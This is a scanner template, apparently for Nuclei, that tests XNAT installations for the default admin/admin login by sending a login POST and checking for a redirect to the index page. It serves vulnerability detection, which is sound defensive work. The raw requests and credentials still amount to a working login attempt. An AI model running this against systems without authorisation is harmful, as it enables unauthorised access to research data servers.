id: xnat-default-login
info:
  author: 0x_Akoko
  classification:
    cwe-id: CWE-798
  description: XNAT default login information (admin/admin) was discovered.
  name: XNAT Default Login
  severity: high
  tags: xnat,default-login
requests:
- attack: pitchfork
  cookie-reuse: true
  matchers:
  - status:
    - 302
    type: status
  - part: location
    type: word
    words:
    - app/template/Index.vm?login=true
  matchers-condition: and
  payloads:
    password:
    - admin
    username:
    - admin
  raw:
  - 'GET /login HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    '
  - 'POST /login HTTP/1.1

    Host: {{Hostname}}

    Origin: {{BaseURL}}

    Content-Type: application/x-www-form-urlencoded

    Referer: {{BaseURL}}/app/template/Login.vm


    login_method=localdb&username={{username}}&password={{password}}&login=&XNAT_CSRF=

    '
